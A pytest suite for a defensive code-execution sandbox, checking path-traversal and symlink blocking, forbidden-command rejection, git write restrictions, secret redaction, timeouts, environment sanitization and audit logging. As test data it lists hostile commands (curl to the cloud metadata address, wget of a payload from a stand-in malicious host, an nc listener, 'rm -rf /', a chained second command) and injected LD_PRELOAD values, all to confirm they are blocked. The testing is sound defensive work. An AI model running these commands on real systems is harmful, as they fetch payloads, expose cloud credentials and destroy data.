"""
Tests for Phase 3: Defensive Sandbox Engine.
Validates:
1. Python runtime execution and output capture
2. Node.js runtime execution and output capture
3. Path traversal blocking (relative and absolute escapes)
4. Symlink escape containment
5. Forbidden token rejection (curl, wget, bash, nc, rm -rf)
6. Git read-only command restrictions
7. Secret token redaction in stdout/stderr
8. Hard timeout enforcement and termination
9. Hostile environment variable sanitization
10. Output buffer truncation
11. Ephemeral execution helpers (run_python_code, run_node_code)
12. Structured audit trail recording
"""

import os
import shutil
from pathlib import Path

from src.config import get_settings
from src.sandbox.audit import get_audit_logger
from src.sandbox.runner import (
    _prepare_sanitized_env,
    execute_sandboxed_command,
    run_node_code,
    run_python_code,
    run_test_suite,
)
from src.sandbox.security import sanitize_sandbox_output, validate_sandbox_command


# 1. Python Runtime Execution
def test_01_python_execution_and_output_capture():
    res = execute_sandboxed_command("python -c \"print('DEFENSIVE_SANDBOX_OK')\"")
    assert res["passed"] is True
    assert res["exit_code"] == 0
    assert "DEFENSIVE_SANDBOX_OK" in res["stdout"]
    assert res["timed_out"] is False
    assert res["execution_time_ms"] > 0


# 2. Node.js Runtime Execution
def test_02_node_execution_and_output_capture():
    if not shutil.which("node"):
        # If node is not installed on this specific machine, verify runner handles gracefully
        return

    res = execute_sandboxed_command("node -e \"console.log('NODE_SANDBOX_ACTIVE')\"")
    assert res["passed"] is True
    assert res["exit_code"] == 0
    assert "NODE_SANDBOX_ACTIVE" in res["stdout"]


# 3. Path Traversal Denial (Relative and Absolute)
def test_03_path_traversal_denial_relative_and_absolute():
    # Relative path traversal targeting /etc/passwd
    res1 = execute_sandboxed_command("python ../../etc/passwd")
    assert res1["passed"] is False
    assert res1["exit_code"] == 126
    assert "SECURITY_VIOLATION" in res1["error"]

    # Absolute path targeting outside workspace root
    res2 = execute_sandboxed_command("python /etc/hosts")
    assert res2["passed"] is False
    assert res2["exit_code"] == 126
    assert "SECURITY_VIOLATION" in res2["error"]

    # Traversal in execution cwd
    res3 = execute_sandboxed_command("python -c \"print(1)\"", cwd_subpath="../../")
    assert res3["passed"] is False
    assert res3["exit_code"] == 126
    assert "SECURITY_VIOLATION" in res3["error"]


# 4. Symlink Escape Containment
def test_04_symlink_escape_containment(tmp_path):
    settings = get_settings()
    workspace = Path(settings.WORKSPACE_ROOT).resolve()

    symlink_dir = workspace / "data" / "scratch" / "test_symlink_jail"
    symlink_dir.mkdir(parents=True, exist_ok=True)
    symlink_target = symlink_dir / "escape_link"

    try:
        # Create a symlink pointing to an outside directory (/tmp or /etc)
        outside_target = Path("/tmp").resolve()
        if symlink_target.exists():
            symlink_target.unlink()
        symlink_target.symlink_to(outside_target)

        # Attempt to run inside the symlink directory
        res = execute_sandboxed_command(
            "python -c \"print(1)\"",
            cwd_subpath=str(symlink_target.relative_to(workspace)),
        )
        assert res["passed"] is False
        assert res["exit_code"] == 126
        assert "SECURITY_VIOLATION" in res["error"]
    finally:
        if symlink_target.exists() or symlink_target.is_symlink():
            try:
                symlink_target.unlink()
            except Exception:
                pass


# 5. Forbidden Token Rejection
def test_05_forbidden_token_denial():
    forbidden_commands = [
        "curl http://169.254.169.254/latest/meta-data/",
        "wget http://malicious.example.com/payload.sh",
        "bash -c 'echo pwned'",
        "sh -c 'id'",
        "nc -lvp 4444",
        "sudo rm -rf /",
        "chmod +x script.py",
        "python -c 'print(1)' ; rm -rf /",
    ]
    for cmd in forbidden_commands:
        res = execute_sandboxed_command(cmd)
        assert res["passed"] is False
        assert res["exit_code"] == 126
        assert "SECURITY_VIOLATION" in res["error"]


# 6. Git Read-Only Command Restrictions
def test_06_git_read_only_restriction():
    # Allowed read-only subcommands
    is_ok, reason, _ = validate_sandbox_command("git status")
    assert is_ok is True
    assert reason is None

    is_ok, reason, _ = validate_sandbox_command("git diff")
    assert is_ok is True

    # Forbidden write / network subcommands
    is_ok, reason, _ = validate_sandbox_command("git push origin main")
    assert is_ok is False
    assert "SECURITY_VIOLATION" in reason

    is_ok, reason, _ = validate_sandbox_command("git commit -m 'evil'")
    assert is_ok is False
    assert "SECURITY_VIOLATION" in reason


# 7. Secret Token Redaction
def test_07_secret_output_redaction():
    fake_sk = "sk-" + "a" * 32
    fake_ghp = "ghp_" + "b" * 36
    raw_output = f"""
    DEBUG: Authenticating with {fake_sk}
    DEBUG: GitHub PAT token is {fake_ghp}
    CONFIG: api_key = "1234567890abcdef1234"
    HEADER: Bearer my_secret_token_value_12345
    """
    cleaned = sanitize_sandbox_output(raw_output)
    assert fake_sk not in cleaned
    assert fake_ghp not in cleaned
    assert "[REDACTED_SECRET]" in cleaned

    # Verify execution output redaction
    cmd = f"python -c \"print('Key: {fake_sk}')\""
    res = execute_sandboxed_command(cmd)
    assert res["passed"] is True
    assert fake_sk not in res["stdout"]
    assert "[REDACTED_SECRET]" in res["stdout"]


# 8. Hard Timeout Enforcement
def test_08_hard_timeout_enforcement():
    # Run a Python sleep of 5 seconds with a 1 second timeout
    res = execute_sandboxed_command(
        "python -c \"import time; time.sleep(5)\"",
        timeout_sec=1,
    )
    assert res["passed"] is False
    assert res["timed_out"] is True
    assert res["exit_code"] == 124
    assert "TIMEOUT" in res["stderr"]


# 9. Hostile Environment Variable Sanitization
def test_09_hostile_environment_sanitization():
    # Inject hostile environment variables into current process and ensure cleanup
    old_env = dict(os.environ)
    try:
        os.environ["LD_PRELOAD"] = "/tmp/malicious.so"
        os.environ["PYTHONPATH"] = "/tmp/fake_modules"
        os.environ["DYLD_INSERT_LIBRARIES"] = "/tmp/libhook.dylib"

        sanitized = _prepare_sanitized_env(allow_network=False)

        assert "LD_PRELOAD" not in sanitized
        assert "PYTHONPATH" not in sanitized
        assert "DYLD_INSERT_LIBRARIES" not in sanitized
        assert sanitized.get("NO_PROXY") == "*"
    finally:
        for k in ["LD_PRELOAD", "PYTHONPATH", "DYLD_INSERT_LIBRARIES"]:
            if k in old_env:
                os.environ[k] = old_env[k]
            else:
                os.environ.pop(k, None)


# 10. Output Buffer Truncation
def test_10_output_buffer_truncation():
    # Generate 100KB of output
    res = execute_sandboxed_command("python -c \"print('A' * 100000)\"")
    settings = get_settings()
    assert len(res["stdout"]) <= settings.SANDBOX_MAX_OUTPUT_BYTES + 100
    assert "[TRUNCATED:" in res["stdout"]


# 11. Ephemeral Code Execution Helpers
def test_11_ephemeral_code_execution_helpers():
    # Test ephemeral Python
    res_py = run_python_code("x = [i**2 for i in range(5)]; print(sum(x))")
    assert res_py["passed"] is True
    assert "30" in res_py["stdout"]

    # Test ephemeral Node.js
    if shutil.which("node"):
        res_node = run_node_code("console.log(Array.from({length: 5}, (_, i) => i*i).reduce((a, b) => a + b, 0))")
        assert res_node["passed"] is True
        assert "30" in res_node["stdout"]

    # Test sandboxed test suite runner inside workspace
    settings = get_settings()
    workspace = Path(settings.WORKSPACE_ROOT).resolve()
    test_unit_file = workspace / "test_workspace_unit.py"
    test_unit_file.write_text("def test_addition():\n    assert 2 + 2 == 4\n", encoding="utf-8")

    try:
        res_test = run_test_suite(framework="pytest", target_path="test_workspace_unit.py")
        assert res_test["passed"] is True
        assert "1 passed" in res_test["stdout"]
    finally:
        if test_unit_file.exists():
            test_unit_file.unlink()


# 12. Structured Audit Trail Recording
def test_12_structured_audit_trail_logging():
    audit = get_audit_logger()
    init_count = audit.count()

    # Successful command
    execute_sandboxed_command("python -c \"print('AUDIT_TEST')\"")
    assert audit.count() > init_count

    recent = audit.get_recent_events(limit=5)
    last_event = recent[-1]
    assert last_event["event_type"] == "COMMAND_EXEC"
    assert last_event["risk_level"] == "LOW"

    # Blocked command
    execute_sandboxed_command("curl http://evil.com")
    recent_after_block = audit.get_recent_events(limit=5)
    blocked_event = recent_after_block[-1]
    assert blocked_event["event_type"] == "SECURITY_BLOCKED"
    assert blocked_event["risk_level"] in {"HIGH", "CRITICAL"}
